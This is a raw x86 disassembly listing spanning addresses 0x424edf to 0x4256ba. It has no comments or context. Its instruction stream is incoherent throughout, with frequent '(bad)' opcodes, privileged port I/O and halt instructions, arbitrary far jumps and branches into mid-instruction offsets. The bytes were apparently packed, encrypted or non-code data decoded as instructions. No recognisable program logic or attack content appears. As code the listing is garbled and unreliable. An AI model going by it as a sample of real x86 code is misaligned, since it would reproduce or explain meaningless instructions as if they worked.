  424edf:	cmp    cl,bl
  424ee1:	cmp    dl,BYTE PTR [ecx+0x52972698]
  424ee7:	mov    DWORD PTR [edi+0x71d721de],ebp
  424eed:	pusha  
  424eee:	outs   dx,DWORD PTR ds:[esi]
  424eef:	adc    eax,0x5e966cd3
  424ef4:	into   
  424ef5:	push   0x4b
  424ef7:	lods   eax,DWORD PTR ds:[esi]
  424ef8:	test   al,0x7d
  424efa:	dec    ebp
  424efb:	pop    ebx
  424efc:	xor    eax,0xd31328e4
  424f01:	sub    cl,bh
  424f03:	cmp    al,0xe3
  424f05:	cwde   
  424f06:	(bad)  
  424f07:	jb     0x424f02
  424f09:	mov    ds:0x605a9c94,eax
  424f0e:	push   ss
  424f0f:	fld    DWORD PTR [eax]
  424f11:	and    sp,WORD PTR [esi+0x46]
  424f15:	inc    eax
  424f16:	sti    
  424f17:	stos   BYTE PTR es:[edi],al
  424f18:	inc    eax
  424f19:	jmp    0x5871:0xa720c2da
  424f20:	popf   
  424f21:	mov    al,ds:0x23e15f51
  424f26:	js     0x424eb4
  424f28:	in     eax,dx
  424f29:	and    cl,BYTE PTR [ecx-0x551aea45]
  424f2f:	lea    esp,[ebx-0x62]
  424f32:	iret   
  424f33:	hlt    
  424f34:	add    cl,BYTE PTR [eax-0x51]
  424f37:	jo     0x424f1a
  424f39:	aas    
  424f3a:	pusha  
  424f3b:	mov    BYTE PTR [ecx-0x8060587],ch
  424f41:	push   edi
  424f42:	xchg   BYTE PTR [esi-0xd],ah
  424f45:	out    dx,al
  424f46:	sbb    eax,0xc7845df5
  424f4b:	shl    ah,0xfc
  424f4e:	mov    cl,0x64
  424f50:	adc    esp,ebx
  424f52:	xlat   BYTE PTR ds:[ebx]
  424f53:	xchg   DWORD PTR ds:0x8716fad4,esp
  424f59:	popa   
  424f5a:	pop    esp
  424f5b:	or     DWORD PTR [eax+0x13],ecx
  424f5e:	arpl   WORD PTR [eax+eax*1+0x799a1be6],bp
  424f65:	ins    BYTE PTR es:[edi],dx
  424f66:	test   eax,0xa6cfb525
  424f6b:	adc    DWORD PTR [ebx+0x7b],ebp
  424f6e:	cmp    ebx,DWORD PTR [edx]
  424f70:	fmul   QWORD PTR [eax-0x4c]
  424f73:	adc    eax,DWORD PTR [ecx+0x4f4471f7]
  424f79:	hlt    
  424f7a:	pop    ebp
  424f7b:	xchg   esi,eax
  424f7c:	jnp    0x424fee
  424f7e:	test   eax,ebx
  424f80:	and    eax,0xaf02c3d5
  424f85:	xor    DWORD PTR ds:0xf09e2488,ebx
  424f8b:	mov    bh,0x5c
  424f8d:	push   edx
  424f8e:	xchg   BYTE PTR [edx],al
  424f90:	xchg   BYTE PTR [eax-0x35],bh
  424f93:	call   FWORD PTR [ebx]
  424f95:	sbb    ch,BYTE PTR [ebx+0x2b]
  424f98:	call   0x8aea:0xcb0ddf5e
  424f9f:	add    dh,bh
  424fa1:	pop    ebp
  424fa2:	mov    eax,0x9f9502b2
  424fa7:	enter  0xf1fa,0x30
  424fab:	loope  0x425016
  424fad:	retf   0x1642
  424fb0:	pushf  
  424fb1:	pop    edx
  424fb2:	les    edx,FWORD PTR [esi-0x2de1eb30]
  424fb8:	push   eax
  424fb9:	xchg   BYTE PTR [eax],ch
  424fbb:	and    eax,0xa2a9d88a
  424fc0:	add    dh,BYTE PTR [esi-0x7de15396]
  424fc6:	in     eax,dx
  424fc7:	mov    bl,0x7c
  424fc9:	test   BYTE PTR ds:[esi-0x520e85cb],dh
  424fd0:	std    
  424fd1:	outs   dx,DWORD PTR ds:[esi]
  424fd2:	inc    ecx
  424fd3:	mov    fs,eax
  424fd5:	push   ecx
  424fd6:	push   ss
  424fd7:	popf   
  424fd8:	push   0x19
  424fda:	mov    DWORD PTR [ebx],ebp
  424fdc:	stos   BYTE PTR es:[edi],al
  424fdd:	mov    eax,0x5bf37371
  424fe2:	push   edi
  424fe3:	sbb    DWORD PTR [ecx-0x1447371],ebx
  424fe9:	aaa    
  424fea:	add    eax,0x63e593b4
  424fef:	or     al,0x9f
  424ff1:	cmp    DWORD PTR [eax+ebx*2+0x539b311f],ebp
  424ff8:	pushf  
  424ff9:	ret    0xeb34
  424ffc:	mov    esp,0x3c33d6a1
  425001:	shl    DWORD PTR [eax],1
  425003:	daa    
  425004:	pop    eax
  425005:	lods   al,BYTE PTR ds:[esi]
  425006:	inc    eax
  425007:	daa    
  425008:	mov    cs,WORD PTR [ebx+0x17769021]
  42500e:	fisub  WORD PTR [edi+0x57]
  425011:	not    BYTE PTR [ebp+0x7b6b7b5f]
  425017:	(bad)  
  425018:	stos   BYTE PTR es:[edi],al
  425019:	push   edi
  42501a:	push   ebp
  42501b:	mov    ah,0xed
  42501d:	(bad)  
  42501e:	rcl    DWORD PTR [edi],0xcb
  425021:	jno    0x425051
  425023:	cmp    bl,BYTE PTR [edi-0x51b1944c]
  425029:	hlt    
  42502a:	mov    ecx,0xedc26634
  42502f:	cmp    esp,DWORD PTR [eax]
  425031:	je     0x424ff6
  425033:	mov    bh,0x72
  425035:	in     al,0x7
  425037:	cmp    DWORD PTR [ecx-0x23],ebx
  42503a:	and    cl,BYTE PTR ds:0x8ff6512e
  425040:	jb     0x42509d
  425042:	mov    al,ds:0xca7083d3
  425047:	mov    edx,0xa1eeaa80
  42504c:	cmc    
  42504d:	pop    ds
  42504e:	cwde   
  42504f:	inc    ebx
  425050:	add    eax,0xd83db3cd
  425055:	ja     0x425059
  425057:	call   ecx
  425059:	pop    ss
  42505a:	pop    eax
  42505b:	cmp    ch,BYTE PTR [edi-0x2ddec8c]
  425061:	jmp    0xc2d4:0x516fb7df
  425068:	mov    bl,0x17
  42506a:	call   FWORD PTR [eax-0x5da40d31]
  425070:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425071:	and    al,0x25
  425073:	cmp    BYTE PTR [ebx],0xbe
  425076:	(bad)  
  425078:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425079:	add    BYTE PTR [ebx],dh
  42507b:	inc    ebp
  42507c:	ds out 0x64,eax
  42507f:	adc    bh,BYTE PTR [esi+edi*8]
  425082:	mov    esp,DWORD PTR [eax-0x3a]
  425085:	dec    esp
  425086:	out    0x1a,eax
  425088:	ja     0x42505a
  42508a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42508b:	adc    bl,0xa8
  42508e:	stos   BYTE PTR es:[edi],al
  42508f:	adc    eax,0xc83f81ce
  425094:	xor    BYTE PTR [ebp+0x430a1579],ch
  42509a:	sub    ebx,DWORD PTR [edx+0xbe0d4]
  4250a0:	dec    esp
  4250a1:	jp     0x4250ab
  4250a3:	ret    
  4250a4:	cmp    bl,dh
  4250a6:	inc    eax
  4250a7:	out    dx,eax
  4250a8:	nop
  4250a9:	jmp    0x4250c9
  4250ab:	jp     0x4250b1
  4250ad:	sbb    eax,0xed88bd40
  4250b2:	nop
  4250b3:	and    ebp,DWORD PTR [ebx+0x7b0eb281]
  4250b9:	sub    eax,0x2e96145e
  4250be:	inc    edx
  4250bf:	sbb    edi,DWORD PTR [ebx-0x5f722f0e]
  4250c5:	dec    ecx
  4250c6:	add    esp,DWORD PTR [edx+0x3309a08a]
  4250cc:	pop    esi
  4250cd:	cmp    ecx,DWORD PTR [edx+0x5c36e33f]
  4250d3:	push   cs
  4250d4:	inc    ecx
  4250d5:	and    DWORD PTR [ebx+0x32c1e9bc],edx
  4250db:	ret    0x6160
  4250de:	jmp    0x42512c
  4250e0:	icebp  
  4250e1:	xor    ebp,ebx
  4250e3:	dec    eax
  4250e4:	fs in  eax,0x45
  4250e7:	mov    al,0xa6
  4250e9:	sti    
  4250ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4250eb:	jl     0x4250ce
  4250ed:	das    
  4250ee:	rcr    DWORD PTR [ebx-0x6f],1
  4250f1:	out    0x7e,eax
  4250f3:	repnz xchg esp,eax
  4250f5:	xchg   DWORD PTR [ebx],ebx
  4250f7:	data16 data16 stos BYTE PTR es:[edi],al
  4250fa:	fcomp  DWORD PTR ds:0x593855ea
  425100:	add    eax,DWORD PTR [ebp-0x754cfc87]
  425106:	mov    al,0x73
  425108:	sub    dh,bh
  42510a:	mov    eax,0x746fdb34
  42510f:	mov    edi,0xba226554
  425114:	jbe    0x4250eb
  425116:	pop    eax
  425117:	pop    ds
  425118:	les    esi,FWORD PTR [ecx-0x61]
  42511b:	rcl    edi,1
  42511d:	push   ecx
  42511e:	xor    eax,0xb3015f4c
  425123:	push   ebx
  425124:	jmp    0x5fac3fb0
  425129:	push   edx
  42512a:	fwait
  42512b:	pushf  
  42512c:	bnd jo 0x4250b8
  42512f:	out    0xaa,eax
  425131:	out    dx,al
  425132:	jae    0x4250ee
  425134:	jnp    0x4250b6
  425136:	bnd jmp 0x42514e
  425139:	adc    DWORD PTR [esi-0x21d11be],ebp
  42513f:	mov    ecx,0x2c8d6d20
  425144:	mov    al,0x76
  425146:	data16 cmp BYTE PTR [edx-0x6ed984de],0xa3
  42514e:	(bad)  
  42514f:	inc    ebx
  425150:	add    DWORD PTR [eax+0x7bfe4616],esi
  425156:	jg     0x425109
  425158:	xor    BYTE PTR [edx+eiz*4+0x740be8d1],bh
  42515f:	cli    
  425160:	sbb    DWORD PTR [ebx+0x37b8e6c7],eax
  425166:	mov    dh,BYTE PTR [esi+0x45]
  425169:	cmc    
  42516a:	xchg   ecx,eax
  42516b:	nop
  42516c:	xchg   DWORD PTR [eax-0x73ce6224],esi
  425172:	push   0x52
  425174:	push   esp
  425175:	mov    ah,BYTE PTR [ebx+0x3ad0c8f9]
  42517b:	(bad)  
  42517c:	adc    eax,0x405466e3
  425181:	push   es
  425182:	retf   0x4ed2
  425185:	jb     0x42518d
  425187:	add    al,BYTE PTR [ebx-0x2d1ffb7e]
  42518d:	dec    ebx
  42518e:	pop    ebp
  42518f:	inc    esp
  425190:	ror    esi,1
  425192:	js     0x4251d3
  425194:	cwde   
  425195:	push   ss
  425196:	jg     0x4251a5
  425198:	pop    es
  425199:	xlat   BYTE PTR ds:[ebx]
  42519a:	(bad)  
  42519b:	jne    0x4251a7
  42519d:	rol    BYTE PTR [eax+0x2c52e86c],cl
  4251a3:	xchg   BYTE PTR [ecx+0x73],bh
  4251a6:	ficom  WORD PTR [ebx+0x47d681f3]
  4251ac:	inc    ebx
  4251ad:	stos   WORD PTR es:[edi],ax
  4251af:	jae    0x4251fc
  4251b1:	int3   
  4251b2:	cdq    
  4251b3:	inc    BYTE PTR [ebx+0x39]
  4251b6:	cld    
  4251b7:	fcom   DWORD PTR ds:0xceee7706
  4251bd:	mov    ebp,0xdbf4bc6e
  4251c2:	loopne 0x4251f8
  4251c4:	inc    ebp
  4251c5:	fld    st(3)
  4251c7:	add    dh,BYTE PTR [eax-0x7e5885d3]
  4251cd:	scas   eax,DWORD PTR es:[edi]
  4251ce:	fiadd  DWORD PTR [esi+ecx*1]
  4251d1:	push   eax
  4251d2:	sti    
  4251d3:	lods   eax,DWORD PTR ds:[esi]
  4251d4:	jge    0x425166
  4251d6:	(bad)  
  4251d7:	shl    BYTE PTR [ebp+0x5f],0xac
  4251db:	je     0x425188
  4251dd:	addr16 and al,0x88
  4251e0:	jge    0x425210
  4251e2:	les    ebx,FWORD PTR [esp+eiz*4-0x3f599e41]
  4251e9:	xchg   esi,eax
  4251ea:	outs   dx,DWORD PTR ds:[esi]
  4251eb:	mov    dl,0xec
  4251ed:	dec    ebp
  4251ee:	pop    ecx
  4251ef:	cmc    
  4251f0:	jle    0x425241
  4251f2:	ffreep st(7)
  4251f4:	(bad)  
  4251f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4251f6:	sbb    al,0x62
  4251f8:	xor    edi,ecx
  4251fa:	ss es addr16 mov ebx,0xece884b8
  425202:	fisub  WORD PTR [ecx]
  425204:	loop   0x4251a7
  425206:	stos   BYTE PTR es:[edi],al
  425207:	push   esp
  425208:	int3   
  425209:	clc    
  42520a:	jno    0x4251d8
  42520c:	jge    0x425207
  42520e:	fnstcw WORD PTR [ecx-0x52f81033]
  425214:	aam    0x9
  425216:	int    0x55
  425218:	push   es
  425219:	jmp    0xf595:0x8da9e9e9
  425220:	or     al,0x6c
  425222:	bound  ebx,QWORD PTR [edi+0x59e29741]
  425228:	inc    esi
  425229:	into   
  42522a:	mov    ebx,0x79e17f41
  42522f:	ins    DWORD PTR es:[edi],dx
  425230:	push   0xdde8052f
  425235:	imul   esi,ecx,0xeea87995
  42523b:	lods   eax,DWORD PTR ds:[esi]
  42523c:	bound  ebp,QWORD PTR [ecx]
  42523e:	cmp    ebx,eax
  425240:	neg    BYTE PTR es:[ebx]
  425243:	add    DWORD PTR [ecx-0x576d48c7],esi
  425249:	pop    es
  42524a:	and    BYTE PTR [esi],al
  42524c:	jnp    0x42525e
  42524e:	push   esi
  42524f:	add    DWORD PTR [edx+0x47],esi
  425252:	fiadd  WORD PTR [edi+0x59]
  425255:	mov    ecx,0xd55c4a50
  42525a:	dec    ebp
  42525b:	jae    0x425261
  42525d:	out    0x62,eax
  42525f:	fisttp QWORD PTR [ebx]
  425261:	inc    ebx
  425262:	mov    eax,0xf708219b
  425267:	mov    cl,0x40
  425269:	sti    
  42526a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42526b:	cdq    
  42526c:	cmc    
  42526d:	psubb  mm7,mm6
  425270:	in     al,dx
  425271:	pop    edx
  425272:	push   ss
  425273:	sub    BYTE PTR [eax],bh
  425275:	ja     0x4252ee
  425277:	das    
  425278:	or     DWORD PTR [ebx],0x91b51506
  42527e:	add    dh,BYTE PTR [edi+0x5c]
  425281:	shl    DWORD PTR [esp+edx*4-0x3b43dc46],0x11
  425289:	mov    eax,0x3a6e831c
  42528e:	mov    bh,0xff
  425290:	adc    eax,0x88e7967f
  425295:	inc    eax
  425296:	stos   DWORD PTR es:[edi],eax
  425297:	hlt    
  425298:	sahf   
  425299:	and    BYTE PTR ss:[edi-0x7],bl
  42529d:	mov    ecx,DWORD PTR [esp+ecx*8-0x7a]
  4252a1:	push   cs
  4252a2:	pop    ebx
  4252a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4252a4:	ja     0x425293
  4252a6:	xchg   ecx,eax
  4252a7:	dec    edi
  4252a8:	mov    eax,ds:0x41ba294
  4252ad:	adc    ebp,edx
  4252af:	xor    ah,bl
  4252b1:	adc    cl,BYTE PTR [edx]
  4252b3:	pop    eax
  4252b4:	sub    DWORD PTR [edi+0x14],esp
  4252b7:	xchg   ebx,eax
  4252b8:	scas   al,BYTE PTR es:[edi]
  4252b9:	outs   dx,DWORD PTR ds:[esi]
  4252ba:	stos   BYTE PTR es:[edi],al
  4252bb:	dec    ebx
  4252bc:	push   es
  4252bd:	xchg   BYTE PTR [ecx+0x6d33d94d],al
  4252c3:	jecxz  0x4252b5
  4252c5:	mov    cl,0x28
  4252c7:	and    eax,0x60d67f37
  4252cc:	adc    ah,BYTE PTR [ebx+0x6d]
  4252cf:	sub    DWORD PTR [edx-0xd],0x30
  4252d3:	sbb    al,0x4e
  4252d5:	inc    esi
  4252d6:	add    al,0x14
  4252d8:	xchg   ebp,eax
  4252d9:	cmp    eax,0x3815cf55
  4252de:	xchg   BYTE PTR [ecx+0x4],cl
  4252e1:	lods   al,BYTE PTR ds:[esi]
  4252e2:	push   eax
  4252e3:	push   cs
  4252e4:	lock dec esi
  4252e6:	mov    ah,0x63
  4252e8:	sbb    BYTE PTR [edi-0x3c0dcc07],al
  4252ee:	and    ebx,DWORD PTR [edi]
  4252f0:	mov    al,BYTE PTR [ebx]
  4252f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4252f3:	js     0x286049aa
  4252f9:	inc    ebx
  4252fa:	es push ebx
  4252fc:	mov    bh,BYTE PTR [edi]
  4252fe:	gs cmp eax,0xf419743e
  425304:	sub    al,0x70
  425306:	jb     0x425340
  425308:	popf   
  425309:	push   ss
  42530a:	xchg   esp,eax
  42530b:	(bad)  
  42530e:	out    dx,eax
  42530f:	stos   BYTE PTR es:[edi],al
  425310:	int3   
  425311:	xor    esp,DWORD PTR [esi]
  425313:	loopne 0x42532c
  425315:	rol    BYTE PTR [ebx+0xd9767de],1
  42531b:	gs popa 
  42531d:	cmp    BYTE PTR [esi-0x78],0x70
  425321:	lods   al,BYTE PTR ds:[esi]
  425322:	clc    
  425323:	xor    al,BYTE PTR [ebx]
  425325:	sbb    esi,DWORD PTR [ecx]
  425327:	mov    al,0x56
  425329:	ins    DWORD PTR es:[edi],dx
  42532a:	cmp    dh,BYTE PTR [ebp-0x3d0f95b2]
  425330:	adc    dl,al
  425332:	jmp    0x1bff9d3a
  425337:	jne    0x425352
  425339:	mov    edx,0x43442b71
  42533e:	fnstenv [edi+eiz*1-0x545dd78a]
  425345:	jb     0x4252fc
  425347:	or     edi,esi
  425349:	mov    al,BYTE PTR [ebp+ecx*2-0x2]
  42534d:	ret    0x0
  425350:	add    BYTE PTR [eax],al
  425352:	fwait
  425353:	push   ebp
  425354:	pusha  
  425355:	outs   dx,DWORD PTR ds:[esi]
  425356:	out    dx,al
  425357:	jg     0x4252f8
  425359:	cmc    
  42535a:	or     DWORD PTR fs:[edi+0x22],ebx
  42535e:	ret    0xfd01
  425361:	iret   
  425362:	and    esp,ecx
  425364:	add    DWORD PTR [eax],eax
  425366:	hlt    
  425367:	add    al,0x0
  425369:	add    ah,cl
  42536b:	mov    ss,ecx
  42536d:	shl    DWORD PTR [ecx],1
  42536f:	(bad)  [edx+0x58]
  425372:	push   esi
  425373:	xchg   ecx,eax
  425374:	retf   0x979b
  425377:	push   edx
  425378:	fwait
  425379:	jecxz  0x425383
  42537b:	ds inc edx
  42537d:	in     al,0x9c
  42537f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425380:	xchg   ebp,eax
  425381:	push   0xffffffa9
  425383:	scas   al,BYTE PTR es:[edi]
  425384:	ss in  eax,dx
  425386:	arpl   WORD PTR [ebp-0x69f14d39],cx
  42538c:	adc    ecx,DWORD PTR [eax-0x37591f88]
  425392:	ja     0x425413
  425394:	cmp    DWORD PTR [ecx+edx*2+0x2],eax
  425398:	fsubr  DWORD PTR [esi+0x77]
  42539b:	xchg   edx,eax
  42539c:	gs icebp 
  42539e:	jb     0x425385
  4253a0:	pop    eax
  4253a1:	pop    edx
  4253a2:	mov    edx,0x5810750b
  4253a7:	ins    BYTE PTR es:[edi],dx
  4253a8:	jl     0x4253df
  4253aa:	adc    ebp,DWORD PTR [edx-0x69]
  4253ad:	sar    BYTE PTR [ecx-0x2d],cl
  4253b0:	popa   
  4253b1:	jmp    0xad97:0x9771ea40
  4253b8:	repz xor al,0xa8
  4253bb:	xchg   edx,eax
  4253bc:	xor    al,0x90
  4253be:	les    esp,FWORD PTR ds:0xe3247188
  4253c4:	sbb    al,0xbe
  4253c6:	mov    ecx,0x83b0a71a
  4253cb:	pop    ss
  4253cc:	fcmovu st,st(5)
  4253ce:	aas    
  4253cf:	xor    BYTE PTR [edx+eiz*1],cl
  4253d2:	lods   eax,DWORD PTR ds:[esi]
  4253d3:	mov    eax,0xe3d9642d
  4253d8:	sub    ebp,DWORD PTR [edx+0x37014f06]
  4253de:	inc    edx
  4253df:	shl    DWORD PTR [esi-0x27446176],0x8b
  4253e6:	pop    ebp
  4253e7:	fucom  st(1)
  4253e9:	jg     0x4253f7
  4253eb:	popf   
  4253ec:	push   esp
  4253ed:	aaa    
  4253ee:	lock ficom DWORD PTR [ebx-0x783dd03f]
  4253f5:	cmp    ebp,ebp
  4253f7:	sbb    BYTE PTR [ebp-0x1fb34558],dh
  4253fd:	xchg   esi,eax
  4253fe:	mov    DWORD PTR [edi],0x474f932e
  425404:	ret    0xbf6
  425407:	or     al,0xec
  425409:	add    ch,BYTE PTR [ecx-0x749c5def]
  42540f:	cmc    
  425410:	fistp  QWORD PTR [esp+ecx*1-0x5d701733]
  425417:	xor    DWORD PTR [ecx-0x19197802],esi
  42541d:	ret    0x2d45
  425420:	ins    BYTE PTR es:[edi],dx
  425421:	or     eax,0x424ae151
  425426:	out    0xa8,al
  425428:	lahf   
  425429:	mov    al,0xfc
  42542b:	in     eax,0x33
  42542d:	push   ebp
  42542e:	jge    0x4254a3
  425430:	inc    edx
  425431:	pop    ebp
  425432:	rcr    edx,1
  425434:	mov    DWORD PTR [ebx+0x7e],edi
  425437:	cmp    DWORD PTR [edx],0x3
  42543a:	fbstp  TBYTE PTR [edi+esi*4-0x45]
  42543e:	ret    0x597f
  425441:	jmp    0xa6ac:0x4008cdd7
  425448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425449:	pop    edi
  42544a:	mov    ecx,0x865473d5
  42544f:	jl     0x425480
  425451:	retf   
  425452:	push   ds
  425453:	clc    
  425454:	addr16 mov dh,0x1d
  425457:	call   FWORD PTR [edx]
  425459:	cmc    
  42545a:	std    
  42545b:	enter  0xb5d6,0xa
  42545f:	jecxz  0x4254c9
  425461:	mov    esp,0x59493b64
  425466:	xor    DWORD PTR gs:[ecx+0x2c45a439],edx
  42546d:	lods   al,BYTE PTR ds:[esi]
  42546e:	pop    edi
  42546f:	add    BYTE PTR [edx-0x3d],ch
  425472:	das    
  425473:	jmp    0x9263bdf8
  425478:	add    edi,ebx
  42547a:	retf   
  42547b:	retf   0x5c62
  42547e:	mov    esp,DWORD PTR [eax+0x714f027a]
  425484:	or     ch,BYTE PTR [edi+esi*1-0x54def0a1]
  42548b:	outs   dx,BYTE PTR ds:[esi]
  42548c:	mov    ah,0x2d
  42548e:	out    dx,al
  42548f:	sub    al,0xbb
  425491:	mov    ds:0xaeb11b0c,al
  425496:	pop    edx
  425497:	pop    ebx
  425498:	pop    ds
  425499:	sub    dh,BYTE PTR [esi]
  42549b:	ins    DWORD PTR es:[edi],dx
  42549c:	test   ch,bl
  42549e:	aam    0x56
  4254a0:	fdiv   DWORD PTR [eax]
  4254a2:	test   BYTE PTR [edx],0xd0
  4254a5:	mov    ds:0x85a219d0,eax
  4254aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4254ab:	imul   ecx,ebx,0xd911abb4
  4254b1:	mov    ah,0x4c
  4254b3:	or     bh,ah
  4254b5:	addr16 retf 
  4254b7:	inc    edi
  4254b8:	jle    0x425501
  4254ba:	aas    
  4254bb:	ror    DWORD PTR [eax-0x7909c00d],0x8c
  4254c2:	add    eax,0x98013f39
  4254c7:	daa    
  4254c8:	xchg   ebx,eax
  4254c9:	or     al,0x78
  4254cb:	outs   dx,BYTE PTR ds:[esi]
  4254cc:	bound  ecx,QWORD PTR [ebp+ecx*4+0x13817ce9]
  4254d3:	mov    eax,DWORD PTR [ecx+eax*1+0x23]
  4254d7:	or     eax,0x4c705bea
  4254dc:	mov    ecx,0x3163746
  4254e1:	mov    DWORD PTR ds:0x3fd98421,esi
  4254e7:	mul    BYTE PTR [edx]
  4254e9:	mov    ds:0x8e78a68,al
  4254ee:	jmp    0x21dda189
  4254f3:	enter  0xb954,0x5f
  4254f7:	repz dec esi
  4254f9:	pop    esi
  4254fa:	adc    ah,BYTE PTR [edi]
  4254fc:	adc    ah,ah
  4254fe:	sub    BYTE PTR [edi],dh
  425500:	xchg   ebp,eax
  425501:	pop    es
  425502:	mov    dl,0xec
  425504:	sub    eax,0x457f3d6f
  425509:	add    edi,DWORD PTR [edx]
  42550b:	mov    ds:0x6034d311,al
  425510:	inc    esi
  425511:	jne    0x4254f2
  425513:	adc    dh,BYTE PTR [eax+0x6cfa0c15]
  425519:	mov    DWORD PTR [ebx+esi*1+0x4550c6bb],ebp
  425520:	loopne 0x42553b
  425522:	pop    eax
  425523:	cmp    ch,BYTE PTR [ebp+edx*4-0x6d8f9055]
  42552a:	xchg   ebx,eax
  42552b:	mov    edi,0xf1222bca
  425530:	adc    ch,BYTE PTR [eax+edi*1-0x16]
  425534:	int    0x1d
  425536:	xchg   esi,eax
  425537:	ret    0x3ab6
  42553a:	adc    BYTE PTR [edi+0x5c],al
  42553d:	in     al,0xa2
  42553f:	shr    BYTE PTR [ebp-0x67c0f51b],1
  425545:	xlat   BYTE PTR ds:[ebx]
  425546:	and    BYTE PTR [ecx],bh
  425548:	clc    
  425549:	(bad)  
  42554a:	je     0x42552a
  42554c:	pushf  
  42554d:	adc    BYTE PTR [ebp+0x5a946c1e],dh
  425553:	sahf   
  425554:	lahf   
  425555:	jbe    0x425521
  425557:	js     0x425592
  425559:	mov    bl,0x6
  42555b:	(bad)  
  42555c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42555d:	popf   
  42555e:	repz mov ebx,0x8839184a
  425564:	iret   
  425565:	push   0xfffffff1
  425567:	test   eax,0xc40e2d80
  42556c:	jne    0x4255dc
  42556e:	loopne 0x42556a
  425570:	and    ah,ah
  425572:	sub    al,0x9b
  425574:	and    ch,BYTE PTR [ecx-0x32b2c247]
  42557a:	(bad)  
  42557b:	aas    
  42557c:	sbb    ecx,DWORD PTR [ebx]
  42557e:	psubb  mm0,QWORD PTR [ebx+esi*1-0x25]
  425583:	in     eax,dx
  425584:	xchg   edi,eax
  425585:	jl     0x42553f
  425587:	into   
  425588:	mov    ah,0xec
  42558a:	lahf   
  42558b:	dec    ecx
  42558c:	adc    DWORD PTR [edx+0x4b5ba936],edi
  425592:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425593:	push   ecx
  425594:	jp     0x425590
  425596:	xor    BYTE PTR [ebx-0x26572927],bh
  42559c:	dec    ebp
  42559d:	dec    esp
  42559e:	adc    bl,BYTE PTR [edx+0x44]
  4255a1:	js     0x425622
  4255a3:	sub    ebx,DWORD PTR [esi-0x6a]
  4255a6:	cdq    
  4255a7:	jge    0x42559e
  4255a9:	jmp    0xc4a64819
  4255ae:	jle    0x425536
  4255b0:	rol    BYTE PTR [esi],0xd2
  4255b3:	mov    ah,0x7d
  4255b5:	daa    
  4255b6:	or     esi,DWORD PTR [ecx]
  4255b8:	inc    esp
  4255b9:	or     al,0x7c
  4255bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4255bc:	mov    ds:0xfbd7e598,eax
  4255c1:	sbb    BYTE PTR [ecx+eax*8+0x404750fc],ah
  4255c8:	mov    ds:0xe90c3d2d,al
  4255cd:	call   edx
  4255cf:	sahf   
  4255d0:	xchg   edi,eax
  4255d1:	stos   DWORD PTR es:[edi],eax
  4255d2:	sub    edx,esp
  4255d4:	pop    eax
  4255d5:	push   edi
  4255d6:	popf   
  4255d7:	cdq    
  4255d8:	cs jns 0x42564e
  4255db:	cli    
  4255dc:	je     0x42558a
  4255de:	push   0xffffffd6
  4255e0:	repz test BYTE PTR [ebp-0x40c336fb],0xf2
  4255e8:	mov    BYTE PTR [ebx],0xc3
  4255eb:	retf   0x840d
  4255ee:	xchg   ch,al
  4255f0:	gs jl  0x42563d
  4255f3:	pop    ds
  4255f4:	je     0x425624
  4255f6:	cld    
  4255f7:	ja     0x425595
  4255f9:	jne    0x425599
  4255fb:	call   0xebfe:0x86ebf154
  425602:	(bad)  
  425603:	jmp    0x84e14025
  425608:	mov    ds:0x9e32c9b,al
  42560d:	dec    esp
  42560e:	lahf   
  42560f:	shl    BYTE PTR [edx],cl
  425611:	scas   al,BYTE PTR es:[edi]
  425612:	push   edx
  425613:	xor    bh,BYTE PTR [ecx-0x63]
  425616:	dec    edx
  425617:	ret    0x28ee
  42561a:	je     0x425655
  42561c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42561d:	mov    WORD PTR [edx+0x59d0d9f0],?
  425623:	mov    al,0x7e
  425625:	cdq    
  425626:	mov    ebp,0x20a44697
  42562b:	inc    BYTE PTR ds:0x3065fff2
  425631:	cwde   
  425632:	ss add al,0x5c
  425635:	mov    esp,0xaf629767
  42563a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42563b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42563c:	aas    
  42563d:	jo     0x425659
  42563f:	pop    ds
  425640:	mov    edx,0x8dcdaccf
  425645:	xchg   esi,eax
  425646:	out    0xa1,eax
  425648:	loop   0x425630
  42564a:	sbb    al,0x7b
  42564c:	adc    bh,bl
  42564e:	fisub  DWORD PTR [edi+0x48aaaf9]
  425654:	jl     0x425600
  425656:	jns    0x4256d7
  425658:	xchg   esi,eax
  425659:	sbb    edi,DWORD PTR [edi]
  42565b:	sub    edi,DWORD PTR ds:[eax+0xe6833ca]
  425662:	test   DWORD PTR [esi],esp
  425664:	popf   
  425665:	ret    0xd93a
  425668:	mov    bh,0xdd
  42566a:	and    dh,BYTE PTR [edi]
  42566c:	and    eax,0xb494244
  425671:	stc    
  425672:	clc    
  425673:	not    DWORD PTR [edi-0x54]
  425676:	sub    al,ch
  425678:	jg     0x42561e
  42567a:	or     ebp,DWORD PTR [ebp+0x53]
  42567d:	js     0x4256c1
  42567f:	(bad)  
  425680:	cld    
  425681:	pop    ebx
  425682:	jnp    0x4256d5
  425684:	pop    ecx
  425685:	mov    edi,0x1e87a0ef
  42568a:	test   BYTE PTR [edi-0xd7a3d42],dh
  425690:	sub    eax,0x978d8f6f
  425695:	bnd jg 0x42562d
  425698:	xor    ebp,0x647e910c
  42569e:	add    al,0xa3
  4256a0:	ins    BYTE PTR es:[edi],dx
  4256a1:	add    dl,ah
  4256a3:	hlt    
  4256a4:	mov    BYTE PTR [eax+0x55],ah
  4256a7:	out    dx,eax
  4256a8:	dec    edi
  4256a9:	dec    esi
  4256aa:	daa    
  4256ab:	mov    ah,0x69
  4256ad:	mov    ah,0x7b
  4256af:	cmp    eax,0x864d26ee
  4256b4:	mov    eax,0x58d2334
  4256b9:	inc    eax
  4256ba:	rcl    dl,cl
